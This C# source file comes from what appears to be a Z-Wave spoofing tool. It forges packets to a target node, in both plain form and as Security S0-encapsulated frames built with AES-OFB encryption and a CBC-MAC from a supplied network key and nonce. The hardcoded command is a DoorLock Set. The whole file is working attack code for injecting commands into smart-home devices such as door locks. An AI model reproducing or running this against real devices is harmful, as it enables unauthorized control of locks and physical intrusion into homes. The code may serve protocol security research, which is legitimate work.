using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ZWaveLib;
using ZWaveLib.CommandClasses;
using System.Reflection;
using System.ComponentModel;

namespace WYP_ZWave_Spoofing_Tool
{
    class Send_command
    {
        public static void RunCommand_Nonsecurity(ZWaveController controller,byte[] dst_node, byte[] packet)
        {
            var command = "DoorLock, Set, 4, 5";
            
            if (string.IsNullOrEmpty(command))
                return;

            var commandTerms = command.Split(new[] { '.', '(', ')', ',', ' ' }, StringSplitOptions.RemoveEmptyEntries);
            if (commandTerms.Length < 3)
            {
                Console.WriteLine("Commands must be issued in format CommandClass.Command(nodeId, _additional params_).");
                return;
            }

            byte nodeId;
            if (!byte.TryParse(commandTerms[2], out nodeId))
                return;

            try
            {
                var node = controller.GetNode(nodeId);
                
                var ccType = Assembly.GetAssembly(typeof(ZWaveController)).GetType(string.Format("ZWaveLib.CommandClasses.{0}", commandTerms[0]), true);
                if (ccType == null)
                    return;

                // currently we try to find method using it's name and parameters count
                var methodInfos = ccType.GetMethods();
                MethodInfo methodToInvoke = null;
                foreach (var methodInfo in methodInfos)
                {
                    if (methodInfo.Name == commandTerms[1] && methodInfo.GetParameters().Length == commandTerms.Length - 2)
                        methodToInvoke = methodInfo;
                }
                if (methodToInvoke == null)
                    return;

                // prepare params
                const int additionalParamsIdx = 3;
                var invokeParams = new List<object> { node };
                var methodParams = methodToInvoke.GetParameters();
                for (var i = 0; i < commandTerms.Length - 3; i++)
                {
                    var paramType = methodParams[i + 1].ParameterType;
                    var val = TypeDescriptor.GetConverter(paramType).ConvertFromString(commandTerms[additionalParamsIdx + i]);
                    invokeParams.Add(val);
                }

                node.Id = dst_node[0];
                node.SendDataRequest(packet);
                node.Id = 0x04;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }


        public static void RunCommand_Security(ZWaveController controller, byte[] dst_node, byte[] packet, byte[] Kn, byte[] nonce)
        {
            byte[] Passwd_c = Enumerable.Repeat<byte>(0xaa, 16).ToArray<byte>();
            byte[] Passwd_m = Enumerable.Repeat<byte>(0x55, 16).ToArray<byte>();
            byte[] IV = new byte[16] { 0x2D, 0xB0, 0xE3, 0x52, 0x86, 0x38, 0xB5, 0x0C, 0, 0, 0, 0, 0, 0, 0, 0 };
            byte SH = 0x81;
            byte SRC = 0x01;

            var command = "DoorLock, Set, 4, 5";

            if (string.IsNullOrEmpty(command))
                return;

            var commandTerms = command.Split(new[] { '.', '(', ')', ',', ' ' }, StringSplitOptions.RemoveEmptyEntries);
            if (commandTerms.Length < 3)
            {
                Console.WriteLine("Commands must be issued in format CommandClass.Command(nodeId, _additional params_).");
                return;
            }

            byte nodeId;
            if (!byte.TryParse(commandTerms[2], out nodeId))
                return;

            try
            {
                var node = controller.GetNode(nodeId);

                var ccType = Assembly.GetAssembly(typeof(ZWaveController)).GetType(string.Format("ZWaveLib.CommandClasses.{0}", commandTerms[0]), true);
                if (ccType == null)
                    return;

                // currently we try to find method using it's name and parameters count
                var methodInfos = ccType.GetMethods();
                MethodInfo methodToInvoke = null;
                foreach (var methodInfo in methodInfos)
                {
                    if (methodInfo.Name == commandTerms[1] && methodInfo.GetParameters().Length == commandTerms.Length - 2)
                        methodToInvoke = methodInfo;
                }
                if (methodToInvoke == null)
                    return;

                // prepare params
                const int additionalParamsIdx = 3;
                var invokeParams = new List<object> { node };
                var methodParams = methodToInvoke.GetParameters();
                for (var i = 0; i < commandTerms.Length - 3; i++)
                {
                    var paramType = methodParams[i + 1].ParameterType;
                    var val = TypeDescriptor.GetConverter(paramType).ConvertFromString(commandTerms[additionalParamsIdx + i]);
                    invokeParams.Add(val);
                }
                

                byte[] MAC = Enumerable.Repeat<byte>(0, 16).ToArray<byte>();
                byte[] Header = Enumerable.Repeat<byte>(0, 20).ToArray<byte>();
                byte[] Kc = Enumerable.Repeat<byte>(0, 16).ToArray<byte>();
                byte[] Km = Enumerable.Repeat<byte>(0, 16).ToArray<byte>();
                byte[] C = new byte[packet.Length];
                Kc = AES.AES128_ECB_ENC(Passwd_c, Kn);
                Km = AES.AES128_ECB_ENC(Passwd_m, Kn);
                for (int i = 8; i < 16; i++) IV[i] = nonce[i - 8];
                C = AES.AES128_OFB_ENC(packet, Kc, IV);
                for (int i = 0; i < 16; i++) { Header[i] = IV[i]; }
                Header[16] = SH;
                Header[17] = SRC;
                Header[18] = dst_node[0];  // It is DST
                Header[19] = (byte)packet.Length;
                MAC = AES.AES128_CBCMAC_ENC(Header, C, Km);

                int packet_length = 19 + packet.Length;
                byte[] S_P = Enumerable.Repeat<byte>(0, packet_length).ToArray<byte>();
                S_P[0] = 0x98; S_P[1] = 0x81;
                /*
                for (int i = 0; i < 8; i++) { S_P[i + 2] = IV[i]; }
                for (int i = 0; i < 4; i++) { S_P[i + 10] = C[i]; }
                S_P[14] = IV[8];
                for (int i = 0; i < 8; i++) { S_P[15 + i] = MAC[i]; }
                */
                for (int i = 0; i < 8; i++) { S_P[i + 2] = IV[i]; }
                for (int i = 0; i < packet.Length; i++) { S_P[i + 10] = C[i]; }
                S_P[10 + packet.Length] = IV[8];
                for (int i = 0; i < 8; i++) { S_P[11 + packet.Length + i] = MAC[i]; }
                
                node.Id = dst_node[0];
                node.SendDataRequest(S_P);
                node.Id = 0x04;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }




    }
}
